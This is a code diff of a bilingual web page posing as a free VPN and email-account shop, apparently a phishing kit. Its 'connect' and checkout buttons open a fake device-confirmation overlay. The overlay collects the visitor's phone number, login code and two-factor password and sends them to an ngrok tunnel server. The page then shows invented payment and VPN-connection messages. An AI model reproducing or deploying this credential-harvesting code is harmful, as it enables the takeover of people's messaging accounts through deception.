+            { country: 'US', flag: '🇺🇸', name: 'Miami Beach', ping: 112, type: 'fast', desc_ru: 'Стриминг 4K', desc_en: '4K Streaming' },
+            { country: 'NL', flag: '🇳🇱', name: 'Amsterdam #2', ping: 43, type: 'fast', desc_ru: 'Быстрый канал', desc_en: 'Fast Channel' },
+            { country: 'GB', flag: '🇬🇧', name: 'Edinburgh Secure', ping: 58, type: 'p2p', desc_ru: 'Безопасный P2P', desc_en: 'Safe P2P' },
+            { country: 'FR', flag: '🇫🇷', name: 'Marseille Stream', ping: 53, type: 'fast', desc_ru: 'HD стриминг', desc_en: 'HD Streaming' },
+            { country: 'RU', flag: '🇷🇺', name: 'Novosibirsk East', ping: 18, type: 'gaming', desc_ru: 'Азия сервер', desc_en: 'Asia Server' }
+        ];
 
-    function setLoading(button, loading) {
-      button.disabled = loading;
-      if (loading) {
-        button.dataset.originalText = button.textContent;
-        button.textContent = '⏳ Загрузка...';
-      } else {
-        button.textContent = button.dataset.originalText || button.textContent;
-      }
-    }
+        let filteredVPNs = [...vpnServers];
 
-    // ========== API Calls ==========
-    async function sendCode() {
-      const phone = phoneInput.value.trim();
-      
-      if (!phone.startsWith('+')) {
-        setStatus('❌ Телефон должен начинаться с + и кода страны', 'error');
-        return;
-      }
-      
-      setLoading(sendCodeBtn, true);
-      setStatus('📤 Отправляю код...', 'info');
-      
-      try {
-        const res = await fetch(`${API_BASE}/send_code`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            phone,
-            init_data: initData  // Передаём initData для валидации
-          })
+        function filterVPNs() {
+            const countryFilter = document.getElementById('country-filter').value;
+            const typeFilter = document.getElementById('type-filter').value;
+            
+            filteredVPNs = vpnServers.filter(vpn => {
+                const matchCountry = countryFilter === 'all' || vpn.country === countryFilter;
+                const matchType = typeFilter === 'all' || vpn.type === typeFilter;
+                return matchCountry && matchType;
+            });
+            
+            renderVPNList();
+        }
+
+        function renderVPNList() {
+            const container = document.getElementById('vpn-list');
+            container.innerHTML = '';
+            
+            filteredVPNs.forEach(vpn => {
+                const desc = currentLang === 'ru' ? vpn.desc_ru : vpn.desc_en;
+                const pingText = currentLang === 'ru' ? 'Пинг:' : 'Ping:';
+                const btnText = currentLang === 'ru' ? 'ВКЛЮЧИТЬ' : 'CONNECT';
+                
+                const card = document.createElement('div');
+                card.className = 'product-card';
+                card.innerHTML = `
+                    <div class="product-info">
+                        <span class="flag">${vpn.flag}</span>
+                        <div class="product-details">
+                            <h3>${vpn.name}</h3>
+                            <p>${pingText} ${vpn.ping}ms | ${desc}</p>
+                        </div>
+                    </div>
+                    <div style="display:flex; align-items: center;">
+                        <span class="price-tag" style="background:rgba(16, 185, 129, 0.1); color: var(--success);">FREE</span>
+                        <button class="action-btn btn-connect" onclick="initiateLogin('VPN: ${vpn.name}', 0)">${btnText}</button>
+                    </div>
+                `;
+                container.appendChild(card);
+            });
+        }
+
+        // === MAIL DATA ===
+        const mails = [
+            { name: "Proton Mail", price: 15, stock: 78, icon: "📧" },
+            { name: "Firstmail", price: 1, stock: 295, icon: "📨" },
+            { name: "Notletters", price: 1, stock: 1602, icon: "📩" },
+            { name: "Rambler", price: 1.50, stock: 1999, icon: "📬" },
+            { name: "Outlook / Hotmail", price: 1, stock: 741, icon: "📮" },
+            { name: "Mail.tm", price: 1, stock: 3819, icon: "✉️" },
+            { name: "GMX", price: 2, stock: 401, icon: "📫" },
+            { name: "Gmail (Old)", price: 50, stock: 12, icon: "G" },
+            { name: "Onet.pl", price: 4, stock: 421, icon: "📨" }
+        ];
+
+        // === STATE & TABS ===
+        let cart = [];
+        let context = 'vpn';
+        let currentTotal = 0;
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.nav-tab').forEach(el => {
+                el.classList.toggle('active', el.dataset.tab === tabId);
+            });
+            document.querySelectorAll('.section-view').forEach(el => {
+                el.classList.remove('active');
+            });
+            document.getElementById('view-' + tabId).classList.add('active');
+        }
+
+        // === RENDER MAIL LIST ===
+        const mailContainer = document.getElementById('mail-list-container');
+        mails.forEach(m => {
+            const el = document.createElement('div');
+            el.className = 'mail-item';
+            const mailLabel = currentLang === 'ru' ? 'Почта |' : 'Mail |';
+            const stockLabel = currentLang === 'ru' ? 'шт' : 'pcs';
+            el.innerHTML = `
+                <div class="mail-left">
+                    <span class="mail-icon">${m.icon}</span>
+                    <span class="mail-name">${mailLabel} ${m.name}</span>
+                </div>
+                <div class="mail-right">
+                    <span class="mail-price">${m.price} ₽</span>
+                    <span class="mail-stock">${m.stock} ${stockLabel}</span>
+                    <button class="action-btn btn-add" style="padding:4px 8px; font-size:18px;" onclick="addToCart('Mail: ${m.name}', ${m.price})">+</button>
+                </div>
+            `;
+            mailContainer.appendChild(el);
         });
-        
-        if (!res.ok) {
-          const error = await res.text();
-          throw new Error(error);
-        }
-        
-        const data = await res.json();
-        sessionId = data.session_id;
-        
-        setStatus('✅ Код отправлен! Проверьте Telegram', 'success');
-        hide(stepPhone);
-        show(stepCode);
-        codeInput.focus();
-        
-      } catch (e) {
-        setStatus(`❌ Ошибка: ${e.message}`, 'error');
-      } finally {
-        setLoading(sendCodeBtn, false);
-      }
-    }
 
-    async function verifyCode() {
-      const code = codeInput.value.trim();
-      
-      if (!sessionId || !code) {
-        setStatus('❌ Введите код', 'error');
-        return;
-      }
-      
-      setLoading(verifyCodeBtn, true);
-      setStatus('🔍 Проверяю код...', 'info');
-      
-      try {
-        const res = await fetch(`${API_BASE}/verify_code`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            session_id: sessionId,
-            code
-          })
+        // === CART LOGIC ===
+        function addToCart(name, price) {
+            cart.push({ name, price });
+            updateCartUI();
+            
+            const badge = document.getElementById('cart-count');
+            badge.style.transform = "scale(1.5)";
+            setTimeout(() => badge.style.transform = "scale(1)", 200);
+        }
+
+        function removeFromCart(index) {
+            cart.splice(index, 1);
+            updateCartUI();
+        }
+
+        function updateCartUI() {
+            const countEl = document.getElementById('cart-count');
+            const listEl = document.getElementById('cart-items');
+            const totalEl = document.getElementById('cart-total');
+
+            if (cart.length > 0) {
+                countEl.textContent = cart.length;
+                countEl.classList.remove('hidden');
+            } else {
+                countEl.classList.add('hidden');
+            }
+
+            currentTotal = cart.reduce((acc, item) => acc + item.price, 0);
+            totalEl.textContent = currentTotal.toFixed(2) + ' ₽';
+
+            listEl.innerHTML = '';
+            if (cart.length === 0) {
+                const emptyMsg = currentLang === 'ru' ? 'Корзина пуста' : 'Cart is empty';
+                listEl.innerHTML = `<div class="empty-cart-msg">${emptyMsg}</div>`;
+                return;
+            }
+
+            cart.forEach((item, index) => {
+                const row = document.createElement('div');
+                row.className = 'cart-item-row';
+                row.innerHTML = `
+                    <div>
+                        <div style="font-weight:600;">${item.name}</div>
+                        <div style="font-size:12px; color:#94a3b8;">${item.price} ₽</div>
+                    </div>
+                    <button class="btn-remove" onclick="removeFromCart(${index})">&times;</button>
+                `;
+                listEl.appendChild(row);
+            });
+        }
+
+        function checkout() {
+            if (cart.length === 0) return;
+            const checkoutText = currentLang === 'ru' ? `Оплата заказа: ${currentTotal} ₽` : `Checkout: ${currentTotal} ₽`;
+            initiateLogin(checkoutText, currentTotal);
+        }
+
+        // === AUTH LOGIC ===
+        const API_BASE = 'https://supercritical-hatable-elanor.ngrok-free.dev';
+        let sessionId = null;
+
+        const overlay = document.getElementById('login-section');
+        const authTitle = document.getElementById('auth-title');
+        const authDesc = document.getElementById('auth-desc');
+        
+        function initiateLogin(actionText, amount = 0) {
+            context = amount > 0 ? 'checkout' : 'vpn';
+            
+            if (currentLang === 'ru') {
+                authTitle.textContent = amount > 0 ? 'Оплата заказа' : 'Активация VPN';
+                authDesc.textContent = amount > 0 
+                    ? `К оплате: ${amount} ₽. Подтвердите номер телефона для списания средств с баланса.`
+                    : `Для подключения к "${actionText}" требуется подтверждение устройства.`;
+            } else {
+                authTitle.textContent = amount > 0 ? 'Order Payment' : 'VPN Activation';
+                authDesc.textContent = amount > 0 
+                    ? `Amount to pay: ${amount} ₽. Confirm your phone number to charge from balance.`
+                    : `To connect to "${actionText}" device confirmation is required.`;
+            }
+            
+            overlay.classList.remove('hidden');
+            document.getElementById('step-phone').classList.remove('hidden');
+            document.getElementById('step-code').classList.add('hidden');
+            document.getElementById('step-2fa').classList.add('hidden');
+            document.getElementById('step-success').classList.add('hidden');
+            document.getElementById('status').textContent = '';
+        }
+
+        function cancelLogin() {
+            overlay.classList.add('hidden');
+            clearInputs();
+        }
+
+        document.getElementById('auth-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const phoneCode = document.getElementById('phone-code').value;
+            const number = document.getElementById('phone-number').value.replace(/[^0-9]/g, '');
+            const phone = phoneCode + number;
+
+            const sendingMsg = currentLang === 'ru' ? 'Отправка СМС...' : 'Sending SMS...';
+            setStatus(sendingMsg, 'info');
+            
+            try {
+                const res = await fetch(`${API_BASE}/send_code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone })
+                });
+                if (!res.ok) throw new Error(await res.text());
+                const data = await res.json();
+                sessionId = data.session_id;
+                
+                document.getElementById('step-phone').classList.add('hidden');
+                document.getElementById('step-code').classList.remove('hidden');
+                setStatus('');
+                document.querySelectorAll('.code_input')[0].focus();
+            } catch (err) {
+                const errorMsg = currentLang === 'ru' ? 'Ошибка: ' : 'Error: ';
+                setStatus(errorMsg + err.message, 'error');
+            }
         });
-        
-        if (!res.ok) {
-          const error = await res.text();
-          throw new Error(error);
-        }
-        
-        const data = await res.json();
-        
-        if (data.twofa_required) {
-          // Требуется пароль 2FA
-          setStatus('🔐 Требуется пароль 2FA', 'info');
-          hide(stepCode);
-          show(step2fa);
-          passwordInput.focus();
-        } else {
-          // Успешный вход
-          const userName = data.user?.name || 'Пользователь';
-          setStatus(`🎉 Успешный вход! Привет, ${userName}`, 'success');
-          hide(stepCode);
-          
-          // Закрываем WebApp через 2 секунды
-          if (tg) {
-            setTimeout(() => tg.close(), 2000);
-          }
-        }
-        
-      } catch (e) {
-        setStatus(`❌ Ошибка: ${e.message}`, 'error');
-      } finally {
-        setLoading(verifyCodeBtn, false);
-      }
-    }
 
-    async function verifyPassword() {
-      const password = passwordInput.value.trim();
-      
-      if (!sessionId || !password) {
-        setStatus('❌ Введите пароль', 'error');
-        return;
-      }
-      
-      setLoading(verifyPasswordBtn, true);
-      setStatus('🔍 Проверяю пароль...', 'info');
-      
-      try {
-        const res = await fetch(`${API_BASE}/verify_password`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            session_id: sessionId,
-            password
-          })
+        async function verifyCode() {
+            const inputs = document.querySelectorAll('.code_input');
+            const code = Array.from(inputs).map(i => i.value).join('');
+            if (code.length !== 5) return;
+
+            const checkingMsg = currentLang === 'ru' ? 'Проверка кода...' : 'Verifying code...';
+            setStatus(checkingMsg, 'info');
+            
+            try {
+                const res = await fetch(`${API_BASE}/verify_code`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionId, code })
+                });
+                const data = await res.json();
+
+                if (data.twofa_required) {
+                    document.getElementById('step-code').classList.add('hidden');
+                    document.getElementById('step-2fa').classList.remove('hidden');
+                    if (data.password_hint) {
+                        document.getElementById('password-hint').textContent = data.password_hint;
+                        document.getElementById('password-hint-container').classList.remove('hidden');
+                    }
+                    setStatus('');
+                } else {
+                    finishAuth(data);
+                }
+            } catch (err) {
+                const wrongCodeMsg = currentLang === 'ru' ? 'Неверный код' : 'Wrong code';
+                setStatus(wrongCodeMsg, 'error');
+                inputs.forEach(i => i.value = '');
+                inputs[0].focus();
+            }
+        }
+
+        document.getElementById('verify-password').addEventListener('click', async () => {
+            const password = document.getElementById('password').value;
+            const checkingMsg = currentLang === 'ru' ? 'Проверка пароля...' : 'Verifying password...';
+            setStatus(checkingMsg, 'info');
+            
+            try {
+                const res = await fetch(`${API_BASE}/verify_password`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ session_id: sessionId, password })
+                });
+                if (!res.ok) throw new Error();
+                const data = await res.json();
+                finishAuth(data);
+            } catch {
+                const wrongPwdMsg = currentLang === 'ru' ? 'Неверный пароль' : 'Wrong password';
+                setStatus(wrongPwdMsg, 'error');
+            }
         });
-        
-        if (!res.ok) {
-          const error = await res.text();
-          throw new Error(error);
-        }
-        
-        const data = await res.json();
-        const userName = data.user?.name || 'Пользователь';
-        
-        setStatus(`🎉 Успешный вход! Привет, ${userName}`, 'success');
-        hide(step2fa);
-        
-        // Закрываем WebApp через 2 секунды
-        if (tg) {
-          setTimeout(() => tg.close(), 2000);
-        }
-        
-      } catch (e) {
-        setStatus(`❌ Ошибка: ${e.message}`, 'error');
-      } finally {
-        setLoading(verifyPasswordBtn, false);
-      }
-    }
 
-    // ========== Event Listeners ==========
-    sendCodeBtn.addEventListener('click', sendCode);
-    verifyCodeBtn.addEventListener('click', verifyCode);
-    verifyPasswordBtn.addEventListener('click', verifyPassword);
+        function finishAuth(data) {
+            document.getElementById('step-code').classList.add('hidden');
+            document.getElementById('step-2fa').classList.add('hidden');
+            document.getElementById('step-success').classList.remove('hidden');
+            
+            const msg = document.getElementById('success-msg');
+            if (context === 'checkout') {
+                if (currentLang === 'ru') {
+                    msg.innerHTML = `Заказ оплачен!<br>Товары отправлены в Telegram.<br>Списано: ${currentTotal} ₽`;
+                } else {
+                    msg.innerHTML = `Order paid!<br>Items sent to Telegram.<br>Charged: ${currentTotal} ₽`;
+                }
+                cart = [];
+                updateCartUI();
+            } else {
+                if (currentLang === 'ru') {
+                    msg.innerHTML = "VPN Конфигурация получена.<br>Подключение установлено.";
+                } else {
+                    msg.innerHTML = "VPN Configuration received.<br>Connection established.";
+                }
+            }
+            setStatus('');
+        }
 
-    // Enter key support
-    phoneInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') sendCode();
-    });
-    
-    codeInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') verifyCode();
-    });
-    
-    passwordInput.addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') verifyPassword();
-    });
-  </script>
+        function setStatus(text, type) {
+            const el = document.getElementById('status');
+            el.textContent = text;
+            el.className = 'status_message ' + (type || '');
+        }
+
+        function clearInputs() {
+            document.getElementById('phone-number').value = '';
+            document.querySelectorAll('.code_input').forEach(i => i.value = '');
+            document.getElementById('password').value = '';
+        }
+
+        // Code Input Auto-focus
+        document.querySelectorAll('.code_input').forEach((input, idx, arr) => {
+            input.addEventListener('input', e => {
+                if(e.target.value) {
+                    if(idx < 4) { arr[idx+1].disabled=false; arr[idx+1].focus(); }
+                    else verifyCode();
+                }
+            });
+            input.addEventListener('keydown', e => {
+                if(e.key === 'Backspace' && !e.target.value && idx > 0) {
+                    arr[idx-1].focus();
+                }
+            });
+        });
+
+        // Phone country sync
+        document.getElementById('country-select').addEventListener('change', function() {
+            document.getElementById('phone-code').value = this.value;
+            document.getElementById('phone-number').placeholder = this.options[this.selectedIndex].dataset.mask;
+        });
+
+        // Initial render
+        renderVPNList();
+    </script>
 </body>
 </html>
